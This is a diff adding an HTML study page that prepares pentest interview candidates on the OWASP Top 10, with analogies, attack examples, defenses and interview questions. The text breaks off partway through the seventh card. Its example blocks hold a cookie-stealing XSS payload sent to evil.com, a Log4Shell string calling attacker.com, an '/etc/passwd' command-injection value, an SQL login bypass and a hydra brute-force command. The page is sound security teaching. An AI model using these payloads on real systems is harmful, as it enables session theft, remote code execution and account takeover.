@@ -1,0 +1,1134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OWASP Top 10 — Pentest Interview Prep</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap');
+
+  :root {
+    --bg: #080c10;
+    --surface: #0d1318;
+    --border: #1a2530;
+    --accent: #00ff88;
+    --accent2: #ff4040;
+    --accent3: #ffcc00;
+    --accent4: #00aaff;
+    --text: #c8d8e0;
+    --muted: #5a7080;
+    --card-bg: #0d1a22;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Animated grid background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 24px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* Header */
+  header {
+    padding: 60px 0 40px;
+    text-align: center;
+    position: relative;
+  }
+
+  .tag {
+    display: inline-block;
+    font-family: 'Space Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent);
+    border: 1px solid var(--accent);
+    padding: 4px 12px;
+    margin-bottom: 20px;
+  }
+
+  h1 {
+    font-size: clamp(32px, 6vw, 64px);
+    font-weight: 800;
+    line-height: 1.0;
+    color: #fff;
+    letter-spacing: -2px;
+  }
+
+  h1 span { color: var(--accent); }
+
+  .subtitle {
+    font-family: 'Space Mono', monospace;
+    font-size: 13px;
+    color: var(--muted);
+    margin-top: 16px;
+    letter-spacing: 1px;
+  }
+
+  /* Progress bar */
+  .progress-wrapper {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 16px 24px;
+    margin: 30px 0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .progress-label {
+    font-family: 'Space Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    white-space: nowrap;
+  }
+
+  .progress-bar {
+    flex: 1;
+    height: 4px;
+    background: var(--border);
+    position: relative;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: var(--accent);
+    width: 0%;
+    transition: width 0.4s ease;
+  }
+
+  .progress-count {
+    font-family: 'Space Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    min-width: 60px;
+    text-align: right;
+  }
+
+  /* Filter tabs */
+  .filters {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-bottom: 30px;
+  }
+
+  .filter-btn {
+    font-family: 'Space Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 1px;
+    padding: 6px 14px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--muted);
+    cursor: pointer;
+    transition: all 0.2s;
+    text-transform: uppercase;
+  }
+
+  .filter-btn:hover, .filter-btn.active {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: rgba(0,255,136,0.05);
+  }
+
+  /* Vuln cards */
+  .vuln-list { display: flex; flex-direction: column; gap: 16px; }
+
+  .vuln-card {
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    overflow: hidden;
+    transition: border-color 0.2s;
+    position: relative;
+  }
+
+  .vuln-card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 3px;
+    background: var(--card-accent, var(--accent));
+  }
+
+  .vuln-card:hover { border-color: var(--card-accent, var(--accent)); }
+  .vuln-card.learned { border-color: var(--accent); }
+  .vuln-card.learned::after {
+    content: '✓ LEARNED';
+    position: absolute;
+    top: 16px; right: 16px;
+    font-family: 'Space Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 2px;
+    color: var(--accent);
+    background: rgba(0,255,136,0.1);
+    padding: 3px 8px;
+    border: 1px solid var(--accent);
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 20px 24px;
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .vuln-num {
+    font-family: 'Space Mono', monospace;
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--card-accent, var(--accent));
+    opacity: 0.4;
+    min-width: 48px;
+  }
+
+  .card-title-group { flex: 1; }
+
+  .card-title {
+    font-size: 18px;
+    font-weight: 800;
+    color: #fff;
+    letter-spacing: -0.5px;
+  }
+
+  .card-tags {
+    display: flex;
+    gap: 6px;
+    margin-top: 6px;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    font-family: 'Space Mono', monospace;
+    font-size: 9px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    padding: 2px 8px;
+    border: 1px solid;
+  }
+
+  .badge-sev-high { border-color: var(--accent2); color: var(--accent2); }
+  .badge-sev-crit { border-color: #ff6600; color: #ff6600; }
+  .badge-sev-med  { border-color: var(--accent3); color: var(--accent3); }
+  .badge-type     { border-color: var(--muted); color: var(--muted); }
+
+  .expand-icon {
+    font-size: 20px;
+    color: var(--muted);
+    transition: transform 0.3s;
+    font-family: 'Space Mono', monospace;
+  }
+
+  .card-body {
+    display: none;
+    padding: 0 24px 24px;
+    border-top: 1px solid var(--border);
+    margin-top: 0;
+  }
+
+  .card-body.open { display: block; }
+
+  /* Sections within card */
+  .section { margin-top: 20px; }
+
+  .section-label {
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 8px;
+  }
+
+  .section-text {
+    font-size: 15px;
+    line-height: 1.7;
+    color: var(--text);
+  }
+
+  /* Analogy box */
+  .analogy-box {
+    background: rgba(255,204,0,0.05);
+    border: 1px solid rgba(255,204,0,0.2);
+    padding: 14px 16px;
+    margin-top: 8px;
+  }
+
+  .analogy-box p {
+    font-size: 14px;
+    line-height: 1.6;
+    color: #e0c060;
+  }
+
+  /* Code block */
+  .code-block {
+    background: #050a0e;
+    border: 1px solid var(--border);
+    padding: 14px 16px;
+    margin-top: 8px;
+    overflow-x: auto;
+  }
+
+  .code-block code {
+    font-family: 'Space Mono', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    white-space: pre;
+    display: block;
+    line-height: 1.6;
+  }
+
+  .code-block code .comment { color: var(--muted); }
+  .code-block code .danger  { color: var(--accent2); }
+  .code-block code .safe    { color: var(--accent); }
+
+  /* Two-col grid for attack/defense */
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-top: 8px;
+  }
+
+  @media (max-width: 600px) { .two-col { grid-template-columns: 1fr; } }
+
+  .col-attack, .col-defend {
+    padding: 12px 14px;
+    border: 1px solid;
+  }
+
+  .col-attack { border-color: rgba(255,64,64,0.3); background: rgba(255,64,64,0.04); }
+  .col-defend { border-color: rgba(0,255,136,0.2); background: rgba(0,255,136,0.03); }
+
+  .col-label {
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .col-attack .col-label { color: var(--accent2); }
+  .col-defend .col-label { color: var(--accent); }
+
+  .col-list {
+    list-style: none;
+    font-size: 13px;
+    line-height: 1.8;
+    color: var(--text);
+  }
+
+  .col-list li::before {
+    content: '→ ';
+    color: var(--muted);
+    font-family: 'Space Mono', monospace;
+  }
+
+  /* Interview Q's */
+  .interview-section {
+    background: rgba(0,170,255,0.04);
+    border: 1px solid rgba(0,170,255,0.2);
+    padding: 14px 16px;
+    margin-top: 8px;
+  }
+
+  .interview-q {
+    font-family: 'Space Mono', monospace;
+    font-size: 12px;
+    color: var(--accent4);
+    margin-top: 8px;
+    padding-left: 12px;
+    border-left: 2px solid var(--accent4);
+    line-height: 1.5;
+  }
+
+  .interview-q:first-child { margin-top: 0; }
+
+  /* Mark learned button */
+  .mark-learned {
+    margin-top: 20px;
+    display: flex;
+    justify-content: flex-end;
+  }
+
+  .learn-btn {
+    font-family: 'Space Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 8px 20px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--muted);
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .learn-btn:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: rgba(0,255,136,0.05);
+  }
+
+  .vuln-card.learned .learn-btn {
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  /* Cheat sheet summary */
+  .cheatsheet {
+    margin: 40px 0 60px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 24px;
+  }
+
+  .cheatsheet h2 {
+    font-size: 20px;
+    font-weight: 800;
+    color: #fff;
+    margin-bottom: 16px;
+    letter-spacing: -0.5px;
+  }
+
+  .cheat-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 8px;
+  }
+
+  .cheat-item {
+    padding: 10px 12px;
+    border: 1px solid var(--border);
+    background: var(--bg);
+    font-size: 13px;
+    line-height: 1.4;
+  }
+
+  .cheat-num {
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    color: var(--muted);
+  }
+
+  .cheat-name {
+    font-weight: 600;
+    color: #fff;
+    margin-top: 2px;
+    font-size: 13px;
+  }
+
+  .cheat-keyword {
+    font-family: 'Space Mono', monospace;
+    font-size: 10px;
+    color: var(--accent);
+    margin-top: 4px;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <div class="tag">Interview Prep · OWASP Top 10 · 2021</div>
+    <h1>Break it to<br><span>Defend it.</span></h1>
+    <p class="subtitle">// all 10 vulnerabilities · analogies · attack examples · interview q's</p>
+  </header>
+
+  <div class="progress-wrapper">
+    <span class="progress-label">MASTERY PROGRESS</span>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <span class="progress-count" id="progressCount">0 / 10</span>
+  </div>
+
+  <div class="filters">
+    <button class="filter-btn active" onclick="filterCards('all', this)">All 10</button>
+    <button class="filter-btn" onclick="filterCards('critical', this)">Critical</button>
+    <button class="filter-btn" onclick="filterCards('injection', this)">Injection-based</button>
+    <button class="filter-btn" onclick="filterCards('access', this)">Access Control</button>
+    <button class="filter-btn" onclick="filterCards('learned', this)">Learned ✓</button>
+  </div>
+
+  <div class="vuln-list" id="vulnList">
+
+    <!-- A01 -->
+    <div class="vuln-card" style="--card-accent:#ff4040" data-tags="critical access" data-id="1">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">01</div>
+        <div class="card-title-group">
+          <div class="card-title">Broken Access Control</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-crit">Critical</span>
+            <span class="badge badge-type">Access Control</span>
+            <span class="badge badge-type">IDOR</span>
+            <span class="badge badge-type">Privilege Escalation</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Users can act outside their intended permissions — accessing other users' data, performing admin actions, or reaching unauthorized pages. The #1 vulnerability in OWASP 2021.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>Imagine a hotel where every room uses the same key. Room 101 could open Room 505 just by changing the room number on the keycard. The front desk (server) trusts what the keycard says without verifying if that guest is actually allowed in that room.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example (IDOR)</div>
+          <div class="code-block"><code><span class="comment"># You're logged in as user 42. Your invoice URL is:</span>
+GET /api/invoices/1042
+
+<span class="comment"># You change the ID — no authorization check on server:</span>
+GET /api/invoices/1043  <span class="danger">→ 200 OK — you just read someone else's invoice</span>
+
+<span class="comment"># Horizontal priv esc: same role, different user</span>
+<span class="comment"># Vertical priv esc: user accesses admin endpoint</span>
+GET /admin/deleteUser?id=99  <span class="danger">→ Works if auth not enforced server-side</span></code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>Change IDs in URLs/params (IDOR)</li><li>Access /admin without being admin</li><li>Replay tokens with modified roles</li><li>Forced browsing to hidden endpoints</li><li>Mass assignment to set role=admin in body</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Enforce access control server-side, always</li><li>Use indirect object references (UUIDs)</li><li>Deny by default</li><li>Log all access control failures</li><li>Rate limit API endpoints</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: What's the difference between horizontal and vertical privilege escalation?</div>
+            <div class="interview-q">Q: How would you test for IDOR in a black-box pentest?</div>
+            <div class="interview-q">Q: A developer says "the button is hidden, users can't find the admin endpoint." Is that secure?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A02 -->
+    <div class="vuln-card" style="--card-accent:#ff6600" data-tags="critical" data-id="2">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">02</div>
+        <div class="card-title-group">
+          <div class="card-title">Cryptographic Failures</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-crit">Critical</span>
+            <span class="badge badge-type">Data Exposure</span>
+            <span class="badge badge-type">Weak Crypto</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Sensitive data is exposed because it's transmitted or stored without proper encryption — or uses weak/broken cryptographic algorithms like MD5, SHA1, or DES.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>Sending your credit card number on a postcard instead of a sealed envelope. Anyone who handles that postcard — the mailman, sorting facility — can read it. HTTPS is the sealed, tamper-evident envelope.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># Passwords stored with MD5 (broken)</span>
+DB: user_password = "5f4dcc3b5aa765d61d8327deb882cf99"
+<span class="danger">→ Instantly cracked: "password" (rainbow tables)</span>
+
+<span class="comment"># HTTP site transmitting session token</span>
+GET http://bank.com/dashboard
+Cookie: session=abc123
+<span class="danger">→ Sniffed on public WiFi via Wireshark / mitmproxy</span>
+
+<span class="comment"># Weak TLS: site supports SSLv3 / TLS 1.0</span>
+→ POODLE / BEAST attack possible</code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>Sniff HTTP traffic (Wireshark, mitmproxy)</li><li>Crack MD5/SHA1 hashes (Hashcat)</li><li>Check for SSLv3/TLS 1.0 (testssl.sh)</li><li>Find sensitive data in API responses</li><li>Downgrade attacks on weak cipher suites</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Use TLS 1.2/1.3 for all traffic</li><li>Hash passwords with bcrypt/Argon2</li><li>Encrypt data at rest (AES-256)</li><li>Never store sensitive data you don't need</li><li>Disable weak ciphers in server config</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: Why is MD5 not suitable for password storage even if the password is complex?</div>
+            <div class="interview-q">Q: What's the difference between hashing, encoding, and encryption?</div>
+            <div class="interview-q">Q: How would you test a web app for cryptographic weaknesses?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A03 -->
+    <div class="vuln-card" style="--card-accent:#ff2255" data-tags="critical injection" data-id="3">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">03</div>
+        <div class="card-title-group">
+          <div class="card-title">Injection</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-crit">Critical</span>
+            <span class="badge badge-type">SQLi</span>
+            <span class="badge badge-type">XSS</span>
+            <span class="badge badge-type">Command Injection</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Untrusted data is sent to an interpreter (SQL engine, shell, LDAP, XML parser) as part of a command or query. The attacker tricks the application into executing unintended commands. SQL Injection is the most famous, but XSS and command injection fall here too.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>Imagine a secretary who types up whatever you say into official memos. You say: "Write a memo saying: fire John. Also, fire the entire finance department." The secretary, blindly following instructions, sends both memos. The app is the secretary — it needs to check if the input is a legitimate instruction, not just follow it blindly.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># Vulnerable SQL query</span>
+SELECT * FROM users WHERE username='$input' AND password='$pass'
+
+<span class="comment"># Attacker enters: ' OR '1'='1</span>
+SELECT * FROM users WHERE username='' OR '1'='1' AND password=''
+<span class="danger">→ Always true. Bypasses login entirely.</span>
+
+<span class="comment"># Command injection via ping field</span>
+Input: 8.8.8.8; cat /etc/passwd
+ping 8.8.8.8; cat /etc/passwd
+<span class="danger">→ Server executes both commands</span>
+
+<span class="comment"># Stored XSS in comment field</span>
+&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;
+<span class="danger">→ Every visitor's session cookie gets stolen</span></code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>SQLMap for automated SQLi detection</li><li>Single quote ' to detect SQL errors</li><li>Burp Suite to fuzz input fields</li><li>OS command injection via ; && ||</li><li>XSS via &lt;script&gt; in every input</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Use parameterized queries / prepared statements</li><li>Input validation and allowlists</li><li>Escape all output (HTML encoding)</li><li>Least privilege DB accounts</li><li>WAF as a secondary layer</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: Walk me through a manual SQLi test step by step, no automated tools.</div>
+            <div class="interview-q">Q: What's the difference between Stored, Reflected, and DOM-based XSS?</div>
+            <div class="interview-q">Q: Why do prepared statements prevent SQL injection?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A04 -->
+    <div class="vuln-card" style="--card-accent:#ff8800" data-tags="critical" data-id="4">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">04</div>
+        <div class="card-title-group">
+          <div class="card-title">Insecure Design</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-high">High</span>
+            <span class="badge badge-type">Architecture</span>
+            <span class="badge badge-type">Business Logic</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Security flaws baked into the design or architecture — not just implementation bugs. The system was designed without thinking about what happens when attackers abuse legitimate features. This is about missing security controls at a design level.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>A bank designs a vault where you can make unlimited "test withdrawals" that don't count until you hit confirm — but never implemented confirmation. The flaw isn't a bug in the code; it's that nobody asked "what if someone spams the test button?" during design phase.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># Business logic flaw: negative quantities</span>
+POST /cart
+{ "item": "laptop", "qty": -1, "price": 999 }
+<span class="danger">→ App refunds $999 to your account (no validation on negative qty)</span>
+
+<span class="comment"># Password reset with no rate limit or account lockout</span>
+→ Attacker brute-forces 6-digit OTP (1,000,000 combos)
+→ Design flaw: should expire after 5 attempts
+
+<span class="comment"># Credential stuffing because no MFA was designed in</span>
+→ 10M leaked username/passwords → automated login attempts</code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>Abuse multi-step flows out of order</li><li>Test negative/zero/large value inputs</li><li>Brute force OTPs with no lockout</li><li>Bypass logic by skipping steps</li><li>Exploit race conditions in workflows</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Threat modeling during design phase</li><li>Security user stories and abuse cases</li><li>Rate limiting and account lockout by design</li><li>Validate all inputs business-logic-wise</li><li>Plimit transactions and review workflows</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: How is Insecure Design different from a misconfiguration or a code bug?</div>
+            <div class="interview-q">Q: Give an example of a business logic vulnerability you've seen or tested.</div>
+            <div class="interview-q">Q: What is threat modeling and when should it happen in the SDLC?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A05 -->
+    <div class="vuln-card" style="--card-accent:#ffcc00" data-tags="critical" data-id="5">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">05</div>
+        <div class="card-title-group">
+          <div class="card-title">Security Misconfiguration</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-high">High</span>
+            <span class="badge badge-type">Cloud</span>
+            <span class="badge badge-type">Default Creds</span>
+            <span class="badge badge-type">XXE</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Insecure default configurations, missing hardening, open cloud storage, enabled debug features, default passwords, overly permissive CORS, verbose error messages. The most common vulnerability in practice — and the most avoidable.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>Moving into a new house and never changing the locks that came with it. The builder, every contractor, and the previous owner all have a copy. "It worked out of the box" doesn't mean it's secure — default = known to everyone.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># Default credentials (very common)</span>
+admin:admin, admin:password, root:root
+<span class="danger">→ Jenkins, Tomcat, routers exposed to internet</span>
+
+<span class="comment"># AWS S3 bucket public read (Capital One breach 2019)</span>
+curl https://s3.amazonaws.com/company-internal-docs/
+<span class="danger">→ 100M customer records exposed</span>
+
+<span class="comment"># Stack trace leaking in error response</span>
+500 Internal Server Error:
+NullPointerException at DatabaseHelper.java:42
+Connection string: jdbc:mysql://prod-db:3306/users
+<span class="danger">→ Attacker now knows DB type, host, and port</span>
+
+<span class="comment"># Directory listing enabled</span>
+GET /backup/  → shows: db_backup_2024.sql, config.env</code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>Shodan for exposed services/defaults</li><li>Test default creds on login panels</li><li>Trigger errors to read stack traces</li><li>Check /.git, /backup, /admin paths</li><li>Test CORS with evil.com origin</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Harden all configs against CIS Benchmarks</li><li>Change all default credentials</li><li>Disable debug/error detail in prod</li><li>Regular config audits and IaC scanning</li><li>Minimal attack surface: disable unused features</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: How would you enumerate misconfigurations in a cloud environment (AWS)?</div>
+            <div class="interview-q">Q: What is XXE and how does it relate to misconfiguration?</div>
+            <div class="interview-q">Q: You find a .git directory exposed on a production server. What can you do with it?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A06 -->
+    <div class="vuln-card" style="--card-accent:#88cc00" data-tags="high" data-id="6">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">06</div>
+        <div class="card-title-group">
+          <div class="card-title">Vulnerable & Outdated Components</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-high">High</span>
+            <span class="badge badge-type">Supply Chain</span>
+            <span class="badge badge-type">CVEs</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Running software components (libraries, frameworks, OS packages) with known vulnerabilities. Log4Shell, Heartbleed, and EternalBlue are all famous examples of attackers exploiting unpatched components at scale.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>Your car has a recalled brake system — the manufacturer sent a fix months ago, but you never applied it. You're not driving an "unpatched car" deliberately, you just never checked. The vulnerability is public knowledge, the exploit is a manual, and you're the one at risk.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># Log4Shell (CVE-2021-44228) — Dec 2021</span>
+<span class="comment"># Log4j logs user-agent string — attacker sends:</span>
+User-Agent: ${jndi:ldap://attacker.com/exploit}
+<span class="danger">→ Server fetches and executes attacker's Java class</span>
+<span class="danger">→ RCE on millions of servers in 72 hours</span>
+
+<span class="comment"># Checking for outdated packages</span>
+npm audit          <span class="safe"># Node.js</span>
+pip-audit          <span class="safe"># Python</span>
+nmap --script vuln <span class="safe"># Service version + CVE check</span>
+
+<span class="comment"># EternalBlue (MS17-010) — WannaCry</span>
+<span class="danger">→ Unpatched Windows SMB → ransomware epidemic</span></code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>Banner grab versions, search NVD/CVEDetails</li><li>Searchsploit for known exploits</li><li>Nmap version scan + vuln scripts</li><li>Check package.json / requirements.txt</li><li>Nuclei templates for CVE detection</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>SCA tools (Snyk, Dependabot, OWASP Dependency-Check)</li><li>Subscribe to CVE feeds</li><li>Patch management policy</li><li>Remove unused dependencies</li><li>SBOM (Software Bill of Materials)</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: Explain how Log4Shell worked at a high level. Why was it so severe?</div>
+            <div class="interview-q">Q: How do you identify the version of a library running on a server you're testing?</div>
+            <div class="interview-q">Q: What's a software supply chain attack? Give an example.</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A07 -->
+    <div class="vuln-card" style="--card-accent:#00aaff" data-tags="high access" data-id="7">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">07</div>
+        <div class="card-title-group">
+          <div class="card-title">Identification & Authentication Failures</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-high">High</span>
+            <span class="badge badge-type">Brute Force</span>
+            <span class="badge badge-type">Session</span>
+            <span class="badge badge-type">Credential Stuffing</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Weaknesses in how the application identifies and authenticates users — allowing attackers to impersonate legitimate users. Includes weak passwords, missing MFA, insecure session tokens, credential stuffing, and broken "forgot password" flows.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>A nightclub that checks ID but accepts a Post-It note with "YES IM 21" written on it. Or one that lets you back in with the same wristband after leaving — even if you lent it to a friend. The bouncer (authentication) trusted the wrong signals.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># Credential stuffing with leaked passwords</span>
+hydra -L users.txt -P rockyou.txt https://target.com/login
+<span class="danger">→ 0.5% success rate × 1M accounts = 5,000 compromised</span>
+
+<span class="comment"># Session token never expires or rotates after login</span>
+Cookie: session=abc123
+<span class="danger">→ Steal the token → replay it for weeks</span>
+
+<span class="comment"># Predictable session token</span>
+session_20240101_user42
+<span class="danger">→ Attacker guesses other users' tokens</span>
+
+<span class="comment"># No rate limiting on password reset OTP</span>
+→ Brute force 6-digit code in minutes</code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>Credential stuffing (Hydra, Burp Intruder)</li><li>Brute force with no lockout</li><li>Session token analysis for predictability</li><li>Token fixation attacks</li><li>Check for session invalidation on logout</li></ul></div>
